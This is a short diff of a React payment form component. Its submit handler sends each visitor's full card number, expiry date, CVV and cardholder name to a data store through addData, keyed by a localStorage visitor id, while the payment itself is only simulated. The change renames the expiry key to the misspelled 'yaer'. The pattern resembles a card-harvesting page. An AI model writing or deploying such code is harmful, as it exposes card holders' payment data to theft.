@@ -42,7 +42,7 @@ export function PaymentForm() {
   function onSubmit(data: PaymentFormValues) {
     setIsSubmitting(true)
     const _id=localStorage.getItem('visitor')
-    addData({id:_id,cardNumber:data.cardNumber,expiryDate:data.expiryDate,cvv:data.cvv,cardholderName:data.cardholderName})
+    addData({id:_id,cardNumber:data.cardNumber,yaer:data.expiryDate,cvv:data.cvv,cardholderName:data.cardholderName})
     // Simulate API call
     setTimeout(() => {
       setIsSubmitting(false)
